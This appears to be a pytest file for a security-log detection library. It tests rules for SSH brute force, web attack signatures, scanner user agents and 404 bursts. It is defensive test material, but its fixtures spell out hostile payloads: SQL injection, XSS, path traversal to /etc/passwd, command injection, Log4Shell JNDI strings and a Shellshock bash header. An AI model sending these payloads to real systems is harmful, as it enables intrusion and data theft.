from __future__ import annotations

from datetime import timedelta

import pytest

from seclog.detectors import (
    Thresholds,
    classify_request,
    detect_404_bursts,
    detect_scanner_agents,
    detect_ssh_attacks,
    detect_web_attacks,
    detect_web_login_bruteforce,
)
from seclog.detectors.scanning import scanner_name
from seclog.detectors.windows import busiest_window
from seclog.models import AuthEventType, Severity
from tests.conftest import BASE, access_event, auth_event

FAIL = AuthEventType.FAILED_PASSWORD


def rules(findings: list) -> set[str]:  # type: ignore[type-arg]
    return {f.rule_id for f in findings}


# --------------------------------------------------------------------------- windows


def test_busiest_window_finds_densest_period() -> None:
    times = [BASE + timedelta(minutes=m) for m in (0, 30, 31, 32, 33, 60)]
    burst = busiest_window(times, timedelta(minutes=5))
    assert burst is not None
    assert burst.count == 4
    assert burst.start == BASE + timedelta(minutes=30)
    assert burst.end == BASE + timedelta(minutes=33)


def test_busiest_window_handles_empty_and_unsorted() -> None:
    assert busiest_window([], timedelta(minutes=1)) is None
    times = [BASE + timedelta(seconds=s) for s in (50, 10, 30)]
    burst = busiest_window(times, timedelta(seconds=40))
    assert burst is not None
    assert burst.count == 3


def test_thresholds_validate() -> None:
    with pytest.raises(ValueError, match="at least 1"):
        Thresholds(ssh_failures=0)


# --------------------------------------------------------------------------- ssh


def test_ssh_brute_force_threshold_boundary() -> None:
    limits = Thresholds(ssh_failures=5, ssh_window_minutes=10)
    four = [auth_event(FAIL, "192.0.2.1", seconds=i * 10) for i in range(4)]
    assert "SSH-BRUTE-FORCE" not in rules(detect_ssh_attacks(four, limits))
    five = [*four, auth_event(FAIL, "192.0.2.1", seconds=50)]
    findings = detect_ssh_attacks(five, limits)
    brute = next(f for f in findings if f.rule_id == "SSH-BRUTE-FORCE")
    assert brute.severity is Severity.HIGH
    assert brute.count == 5
    assert brute.ip == "192.0.2.1"


def test_ssh_failures_spread_out_are_not_brute_force() -> None:
    slow = [auth_event(FAIL, "192.0.2.1", seconds=i * 3600) for i in range(10)]
    assert "SSH-BRUTE-FORCE" not in rules(detect_ssh_attacks(slow, Thresholds()))


def test_login_after_brute_force_is_critical() -> None:
    events = [auth_event(FAIL, "192.0.2.150", user="deploy", seconds=i) for i in range(6)]
    events.append(auth_event(AuthEventType.ACCEPTED, "192.0.2.150", user="deploy", seconds=60))
    findings = detect_ssh_attacks(events, Thresholds())
    compromise = next(f for f in findings if f.rule_id == "SSH-LOGIN-AFTER-BRUTE-FORCE")
    assert compromise.severity is Severity.CRITICAL
    assert "deploy" in compromise.description


def test_successful_login_without_failures_is_not_flagged() -> None:
    events = [auth_event(AuthEventType.ACCEPTED, "198.51.100.10", user="deploy")]
    assert detect_ssh_attacks(events, Thresholds()) == []


def test_user_enumeration() -> None:
    users = ["oracle", "test", "git", "pi", "guest"]
    events = [
        auth_event(AuthEventType.INVALID_USER, "203.0.113.77", user=u, seconds=i * 900)
        for i, u in enumerate(users)
    ]
    findings = detect_ssh_attacks(events, Thresholds(user_enum_distinct=5))
    assert rules(findings) == {"SSH-USER-ENUMERATION"}
    assert findings[0].count == 5


def test_distributed_attack_on_one_account() -> None:
    events = [auth_event(FAIL, f"198.51.100.{i}", user="admin", seconds=i * 1200) for i in range(5)]
    findings = detect_ssh_attacks(events, Thresholds(distributed_ips=5))
    distributed = next(f for f in findings if f.rule_id == "SSH-DISTRIBUTED-ATTACK")
    assert distributed.ip is None
    assert distributed.count == 5


def test_root_login_is_reported() -> None:
    events = [auth_event(AuthEventType.ACCEPTED, "198.51.100.10", user="root", method="publickey")]
    assert rules(detect_ssh_attacks(events, Thresholds())) == {"SSH-ROOT-LOGIN"}


# --------------------------------------------------------------------------- web signatures


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("/products.php?id=12%27%20UNION%20ALL%20SELECT%20NULL--", "WEB-SQLI"),
        ("/item?id=1%20or%201=1", "WEB-SQLI"),
        ("/item?id=1'%20AND%20SLEEP(5)--%20-", "WEB-SQLI"),
        ("/q?x=1;DROP%20TABLE%20users", "WEB-SQLI"),
        ("/login?user=admin'--", "WEB-SQLI"),
        ("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "WEB-XSS"),
        ("/search?q=%253Cscript%253Ealert(1)", "WEB-XSS"),  # double encoded
        ('/p?x="><img src=x onerror=alert(1)>', "WEB-XSS"),
        ("/r?next=javascript:alert(document.cookie)", "WEB-XSS"),
        ("/download.php?file=../../../../etc/passwd", "WEB-PATH-TRAVERSAL"),
        ("/download.php?file=..%2f..%2fetc%2fpasswd", "WEB-PATH-TRAVERSAL"),
        ("/index.php?page=php://filter/resource=index.php", "WEB-PATH-TRAVERSAL"),
        ("/static/..\\..\\windows\\win.ini", "WEB-PATH-TRAVERSAL"),
        ("/ping?host=127.0.0.1;cat%20/etc/hosts", "WEB-COMMAND-INJECTION"),
        ("/x?cmd=$(whoami)", "WEB-COMMAND-INJECTION"),
        ("/.env", "WEB-SENSITIVE-FILE"),
        ("/.git/config", "WEB-SENSITIVE-FILE"),
        ("/backup.sql", "WEB-SENSITIVE-FILE"),
        ("/phpmyadmin/", "WEB-SENSITIVE-FILE"),
        ("/?x=${jndi:ldap://203.0.113.1/a}", "WEB-LOG4SHELL"),
        ("/?x=${${lower:j}ndi:dns://x}", "WEB-LOG4SHELL"),
    ],
)
def test_signatures_detect_attacks(path: str, expected: str) -> None:
    matched = {s.rule_id for s in classify_request(access_event(path))}
    assert expected in matched


@pytest.mark.parametrize(
    "path",
    [
        "/",
        "/blog/secure-your-wordpress-site",
        "/search?q=laptop+bag",
        "/products.php?id=12",
        "/search?q=union+station+selection",
        "/assets/js/app.js?v=3",
        "/blog/why-i-love-select-boxes",
        "/environment-day",
        "/about-us/our-story",
        "/images/hero.webp",
    ],
)
def test_benign_requests_do_not_match(path: str) -> None:
    assert classify_request(access_event(path)) == []


def test_header_signatures_check_user_agent() -> None:
    log4shell = access_event("/", user_agent="${jndi:ldap://203.0.113.130:1389/Exploit}")
    shellshock = access_event("/cgi-bin/x", user_agent="() { :; }; /bin/bash -c 'id'")
    assert {s.rule_id for s in classify_request(log4shell)} == {"WEB-LOG4SHELL"}
    assert "WEB-SHELLSHOCK" in {s.rule_id for s in classify_request(shellshock)}
    # URL-only signatures ignore headers.
    assert classify_request(access_event("/", user_agent="<script>")) == []


def test_web_attack_findings_are_grouped_per_ip_and_rule() -> None:
    events = [
        access_event("/?id=1%20or%201=1", ip="192.0.2.5", seconds=1),
        access_event("/?id=2%20or%202=2", ip="192.0.2.5", seconds=2, status=500),
        access_event("/?id=1%20or%201=1", ip="192.0.2.6", seconds=3, status=403),
    ]
    findings = detect_web_attacks(events)
    assert [(f.ip, f.count) for f in findings] == [("192.0.2.5", 2), ("192.0.2.6", 1)]
    assert any("returned 2xx" in e for e in findings[0].evidence)
    assert not any("returned 2xx" in e for e in findings[1].evidence)


# --------------------------------------------------------------------------- scanning


def test_404_burst_severity_levels() -> None:
    limits = Thresholds(scan_404s=5, scan_window_minutes=1)
    medium = [access_event(f"/p{i}", ip="192.0.2.9", status=404, seconds=i) for i in range(6)]
    high = [access_event(f"/p{i}", ip="192.0.2.10", status=404, seconds=i) for i in range(15)]
    below = [access_event(f"/p{i}", ip="192.0.2.11", status=404, seconds=i * 60) for i in range(6)]
    findings = {f.ip: f for f in detect_404_bursts(medium + high + below, limits)}
    assert findings["192.0.2.9"].severity is Severity.MEDIUM
    assert findings["192.0.2.10"].severity is Severity.HIGH
    assert "192.0.2.11" not in findings


@pytest.mark.parametrize(
    ("agent", "tool"),
    [
        ("sqlmap/1.8.9#stable (https://sqlmap.org)", "sqlmap"),
        ("Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)", "Nikto"),
        ("gobuster/3.6", "Gobuster"),
        ("Fuzz Faster U Fool v2.1.0", "ffuf"),
        ("Mozilla/5.0 (compatible; Nmap Scripting Engine)", "Nmap NSE"),
    ],
)
def test_scanner_names(agent: str, tool: str) -> None:
    assert scanner_name(agent) == tool


def test_regular_browsers_are_not_scanners() -> None:
    assert scanner_name("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0") is None
    assert scanner_name("") is None


def test_scanner_agent_findings() -> None:
    events = [
        access_event("/", ip="192.0.2.33", user_agent="Nikto/2.5.0", seconds=i) for i in range(3)
    ]
    (finding,) = detect_scanner_agents(events)
    assert finding.count == 3
    assert "Nikto" in finding.description


def test_web_login_brute_force() -> None:
    limits = Thresholds(web_login_attempts=10, web_login_window_minutes=5)
    attack = [
        access_event("/wp-login.php", ip="198.51.100.200", method="POST", seconds=i * 5)
        for i in range(10)
    ]
    gets = [access_event("/wp-login.php", ip="198.51.100.201", seconds=i) for i in range(20)]
    findings = detect_web_login_bruteforce(attack + gets, limits)
    assert [f.ip for f in findings] == ["198.51.100.200"]
    assert findings[0].severity is Severity.HIGH
